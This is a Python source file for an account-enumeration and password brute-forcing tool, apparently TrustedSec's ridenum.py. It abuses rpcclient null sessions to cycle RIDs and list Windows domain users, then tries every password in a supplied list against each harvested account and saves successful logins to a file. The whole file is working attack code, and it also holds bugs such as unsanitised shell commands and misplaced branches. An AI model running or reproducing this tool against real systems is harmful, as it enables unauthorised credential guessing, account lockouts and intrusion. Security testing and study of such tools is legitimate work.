#!/usr/bin/python
# coding=utf-8
import os
import subprocess
import sys

# check for python pexpect
try:
    import pexpect
# if we don't have it
except ImportError:
    print("[!] Sorry boss, python-pexpect is not installed. You need to install this first.")
    sys.exit()


#############################################################################################################
#
# RID Enum
# RID Cycling Tool
#
# Written by: David Kennedy (ReL1K)
# Website: https://www.trustedsec.com
# Twitter: @TrustedSec
# Twitter: @HackingDave
#
# This tool will use rpcclient to cycle through and identify what rid accounts exist. Uses a few
# different techniques to find the proper RID.
#
# Special thanks to Tom Steele for the pull request update and changes.
#
#############################################################################################################


def usage():
    print("""
.______       __   _______         _______ .__   __.  __    __  .___  ___.
|   _  \     |  | |       \       |   ____||  \ |  | |  |  |  | |   \/   |
|  |_)  |    |  | |  .--.  |      |  |__   |   \|  | |  |  |  | |  \  /  |
|      /     |  | |  |  |  |      |   __|  |  . `  | |  |  |  | |  |\/|  |
|  |\  \----.|  | |  '--'  |      |  |____ |  |\   | |  `--'  | |  |  |  |
| _| `._____||__| |_______/  _____|_______||__| \__|  \______/  |__|  |__|
                            |______|

Written by: David Kennedy (ReL1K)
Company: https://www.trustedsec.com
Twitter: @TrustedSec
Twitter: @HackingDave

Rid Enum is a RID cycling attack that attempts to enumerate user accounts through
null sessions and the SID to RID enum. If you specify a password file, it will
automatically attempt to brute force the user accounts when its finished enumerating.

- RID_ENUM is open source and uses all standard python libraries minus python-pexpect. -

You can also specify an already dumped username file, it needs to be in the DOMAINNAME\\USERNAME
format.

Example: ./ridenum.py 192.168.1.50 500 50000 /root/dict.txt

Usage: ./ridenum.py <server_ip> <start_rid> <end_rid> <optional_password_file> <optional_username_filename>
""")
    sys.exit()


# for nt-status-denied
denied = 0


# attempt to use lsa query first
def check_user_lsa(ip):
    # pull the domain via lsaenum
    proc = subprocess.Popen('rpcclient -U "" {0} -N -c "lsaquery"'.format(ip), stdout=subprocess.PIPE, shell=True)
    stdout_value = proc.communicate()[0]
    # if the user wasn't found, return a False
    if not "Domain Sid" in stdout_value:
        return False
    else:
        return stdout_value


# attempt to lookup an account via rpcclient
def check_user(ip, account):
    proc = subprocess.Popen('rpcclient -U "" {0} -N -c "lookupnames {1}"'.format(ip, account),
                            stdout=subprocess.PIPE,
                            stderr=subprocess.PIPE,
                            shell=True)

    stdout_value = proc.communicate()[0]
    # if the user wasn't found, return a False
    bad_statuses = ["NT_STATUS_NONE_MAPPED", "NT_STATUS_CONNECTION_REFUSED", "NT_STATUS_ACCESS_DENIED"]
    if any(x in stdout_value for x in bad_statuses):
        return False
    else:
        return stdout_value


# helper function to break a list up into smaller lists
def chunk(l, n):
    for i in range(0, len(l), n):
        yield l[i:i + n]


# this will do a conversion to find the account name based on rid
# looks up multiple sid-rids at a time provided a range
def sids_to_names(ip, sid, start, stop):
    rid_accounts = []
    ranges = ['{0}-{1}'.format(sid, rid) for rid in range(start, stop)]
    # different chunk size for darwin (os x)
    chunk_size = 2500
    if sys.platform == 'darwin':
        chunk_size = 5000
    chunks = list(chunk(ranges, chunk_size))
    for c in chunks:
        command = 'rpcclient -U "" {0} -N -c "lookupsids '.format(ip)
        command += ' '.join(c)
        command += '"'
        proc = subprocess.Popen(command, stdout=subprocess.PIPE,
                                stderr=subprocess.PIPE, shell=True)
        stdout_value = proc.communicate()[0]
        if "NT_STATUS_ACCESS_DENIED" in stdout_value:
            print("[!] Server sent NT_STATUS_ACCESS DENIED, unable to extract users.")
            global denied
            denied = 1

            break
        for line in stdout_value.rstrip().split('\n'):
            if "*unknown*" not in line:
                if line != "":
                    rid_account = line.split(" ", 1)[1]
                    # will show during an unhandled request
                    # '00000' are bogus accounts?
                    # only return accounts ie. (1). Everything else should be a group
                    if rid_account != "request" and '00000' not in rid_account and '(1)' in rid_account:
                        # here we join based on spaces, for example 'Domain Admins' needs to be joined
                        rid_account = rid_account.replace("(1)", "")
                        # return the full domain\username
                        rid_account = rid_account.rstrip()
                        rid_accounts.append(rid_account)
    return rid_accounts


# capture initial input
success = False
sid = None
try:
    if len(sys.argv) < 4:
        usage()
    ip = sys.argv[1]
    rid_start = sys.argv[2]
    rid_stop = sys.argv[3]
    # if password file was specified
    passwords = ""
    # if we use userlist
    userlist = ""
    if len(sys.argv) > 4:
        # pull in password file
        passwords = sys.argv[4]
        # if its not there then bomb out
        if not os.path.isfile(passwords):
            print("[!] File was not found. Please try a path again.")
            sys.exit()
    if len(sys.argv) > 5:
        userlist = sys.argv[5]
        if not os.path.isfile(userlist):
            print("[!] File was not found. Please try a path again.")
            sys.exit()

    # if userlist is being used versus rid enum, then skip all of this
    if not userlist:
        print("[*] Attempting lsaquery first...This will enumerate the base domain SID")
        # call the check_user_lsa function and check to see if we can find base SID guid
        sid = check_user_lsa(ip)
        # if lsa enumeration was successful then don't do
        if sid:
            sid = sid.replace("WARNING: Ignoring invalid value 'share' for parameter 'security'", "")
            print("[*] Successfully enumerated base domain SID. Printing information: \n" + sid.rstrip())
            print("[*] Moving on to extract via RID cycling attack.. ")  # format it properly
            sid = sid.rstrip()
            sid = sid.split(" ")
            sid = sid[4]
    # if we weren't successful on lsaquery
    else:
        print("[!] Unable to enumerate through lsaquery, trying default account names..")
        accounts = ("administrator", "guest", "krbtgt", "root")
        for account in accounts:
            # check the user account based on tuple
            sid = check_user(ip, account)
            # if its false then cycle threw
            if not sid:
                print("[!] Failed using account name: {0}...Attempting another.".format(account))
            else:
                # success! Break out of the loop
                print("[*] Successfully enumerated SID account.. Moving on to extract via RID.\n")
                break
        # if we found one
        if sid:
            # pulling the exact domain SID out
            sid = sid.split(" ")
            # pull first in tuple
            sid = sid[1]
            # remove the RID number
            sid = sid[:-4]
            # we has no sids :( exiting
        else:
            denied = 1
            print("[!] Failed to enumerate SIDs, pushing on to another method.")

    print("[*] Enumerating user accounts.. This could take a little while.")
    # assign rid start and stop as integers
    rid_start = int(rid_start)
    rid_stop = int(rid_stop)

    # this is where we write out our output
    if os.path.isfile("{0}_users.txt".format(ip)):
        # remove old file
        os.remove("{0}_users.txt".format(ip))
    with open("{0}_users.txt".format(ip), "a") as filewrite:
        # cycle through rid and enumerate the domain
        sid_names = sids_to_names(ip, sid, rid_start, rid_stop)
        if sid_names:
            for name in sid_names:
                # print the sid
                print("Account name: {0}".format(name))
                # write the file out
                filewrite.write(name + "\n")

    if denied == 0:
        print("[*] RID_ENUM has finished enumerating user accounts...")

    # if we failed all other methods, we'll move to enumdomusers
    if denied == 1:
        print("[*] Attempting enumdomusers to enumerate users...")
        proc = subprocess.Popen("rpcclient -U '' -N {0} -c 'enumdomusers'".format(ip), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
        with open("{0}_users.txt".format(ip), "a") as filewrite:
            counter = 0
            for line in iter(proc.stdout.readline, ''):
                counter = 1
                if line != '':
                    if "user:" in line:
                        # cycle through
                        line = line.split("rid:")
                        line = line[0].replace("user:[", "").replace("]", "")
                        print(line)
                        filewrite.write(line + "\n")
                    else:
                        denied = 2
                        break
                else:
                    if counter == 0:
                        break

        # if we had nothing to pull
        if counter == 0:
            denied = 2

        if denied == 2:
            print("[!] Sorry. RID_ENUM failed to successfully enumerate users. Bummers.")

        if denied == 1:
            print("[*] Finished dumping users, saved to {0}_users.txt.".format(ip))

    # if we specified a password list
    if passwords:
        # our password file
        with open(passwords) as fileopen:
            passfile = fileopen.readlines()

        # if userlist was specified use the userlist specified
        if not userlist:
            # our list of users
            userlist = "{0}_users.txt".format(ip)

        with open(userlist) as fileopen:
            userfile = fileopen.readlines()

        # cycle through username first
        for user in userfile:
            with open("{0}_success_results.txt".format(ip), "a") as filewrite:
                user = user.rstrip()
                user_fixed = user.replace("\\", "\\\\").replace("'", "")

                # if the user isn't blank
                if user:
                    for password in passfile:
                        password = password.rstrip()
                        # if we specify a lowercase username
                        if password == "lc username":
                            try:
                                if "\\" in password:
                                    password = user.split("\\")[1]
                                    password = password.lower()
                                # if domain isn't specified
                                else:
                                    password = user.lower()
                            except:
                                pass
                        # if we specify a uppercase username
                        if password == "uc username":
                            try:
                                if "\\" in password:
                                    password = user.split("\\")[1]
                                    password = password.upper()
                                else:
                                    password = user.lower()
                            except:
                                pass
                        if password != "":
                            child = pexpect.spawn("rpcclient -U '{0}%{1}' {2}".format(user_fixed, password, ip))
                        # if we are using a blank password
                        if password == "":
                            child = pexpect.spawn("rpcclient -U '{0}' -N {1}".format(user_fixed, ip))

                        i = child.expect(['LOGON_FAILURE', 'rpcclient', 'NT_STATUS_ACCOUNT_EXPIRED',
                                          'NT_STATUS_ACCOUNT_LOCKED_OUT', 'NT_STATUS_PASSWORD_MUST_CHANGE',
                                          'NT_STATUS_ACCOUNT_DISABLED', 'NT_STATUS_LOGON_TYPE_NOT_GRANTED',
                                          'NT_STATUS_BAD_NETWORK_NAME', 'NT_STATUS_CONNECTION_REFUSED',
                                          'NT_STATUS_PASSWORD_EXPIRED', 'NT_STATUS_NETWORK_UNREACHABLE'])

                        # login failed for this one
                        if i == 0:
                            if "\\" in password:
                                password = password.split("\\")[1]
                            print("Failed guessing username of {0} and password of {1}".format(user, password))
                            child.kill(0)

                        # if successful
                        if i == 1:
                            print("[*] Successfully guessed username: {0} with password of: {1}".format(user, password))
                            filewrite.write("username: {0} password: {1}\n".format(user, password))
                            success = True
                            child.kill(0)

                        # if account expired
                        if i == 2:
                            print("[-] Successfully guessed username: {0} with password of: {1} however, it is set to expired.".format(user, password))
                            filewrite.write("username: {0} password: {1}\n".format(user, password))
                            success = True
                            child.kill(0)

                        # if account is locked out
                        if i == 3:
                            print("[!] Careful. Received a NT_STATUS_ACCOUNT_LOCKED_OUT was detected.. \
                                                          You may be locking accounts out!")
                            child.kill(0)

                        # if account change is needed
                        if i == 4:
                            print("[*] Successfully guessed password but needs changed. Username: {0} with password of: {1}".format(user, password))
                            filewrite.write("CHANGE PASSWORD NEEDED - username: {0} password: {1}\n".format(user, password))
                            success = True
                            child.kill(0)

                            # if account is disabled
                        if i == 5:
                            print("[*] Account is disabled: {0} with password of: {1}".format(user, password))
                            filewrite.write("ACCOUNT DISABLED: {0} PW: {1}\n".format(user, password))
                            success = True
                            child.kill(0)

                        if i == 8 or i == 9:
                            print("[!] Unable to connect to the server. Try again or check networking settings.")
                            print("[!] Exiting RIDENUM...")
                            success = False
                            sys.exit()

                        # if successful
                        if i == 9:
                            print("[*] Successfully guessed username: {0} with password of (NOTE IT IS EXPIRED!): {1}".format(user, password))
                            filewrite.write("username: {0} password: {1} (password expired)\n".format(user, password))
                            success = True
                            child.kill(0)

        # if we got lucky
        if success:
            print("[*] We got some accounts, exported results to {0}_success_results_txt".format(ip))
            print("[*] All accounts extracted via RID cycling have been exported to {0}_users.txt".format(ip))
        # if we weren't successful
        else:
            print("\n[!] Unable to brute force a user account, sorry boss.")

        # exit out after we are finished
        sys.exit()  # except keyboard interrupt
except KeyboardInterrupt:
    print("[*] Okay, Okay... Exiting... Thanks for using ridenum.py")
